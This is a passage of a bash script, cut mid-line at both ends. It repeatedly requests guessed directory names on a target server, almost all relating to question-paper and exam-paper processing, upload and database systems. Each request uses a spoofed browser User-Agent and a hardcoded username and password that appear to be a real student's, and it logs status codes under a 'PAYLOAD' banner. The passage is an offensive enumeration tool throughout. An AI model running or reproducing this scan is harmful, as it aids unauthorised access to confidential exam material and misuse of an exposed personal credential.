" "${target}SyncQPProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_FileUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_FileUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_FileUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing_QPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing_QPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing_QPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-QPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_Module/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_Module/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_Module/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Suite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Suite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Suite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Processing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Processing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Processing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-Panel/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-Panel/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-Panel/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-Ops/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-Ops/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-Ops/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlDataUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlDataUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlDataUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPMaster/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPMaster/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPMaster/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-System/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-System/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-System/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQPWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_DataPipeline/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_DataPipeline/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_DataPipeline/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_FileProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_FileProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_FileProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_DatabaseManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_DatabaseManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_DatabaseManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_ExamPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_ExamPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_ExamPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_ProcessingSuite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_ProcessingSuite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_ProcessingSuite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Workflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Workflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Workflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_DataProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_DataProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_DataProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Tool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
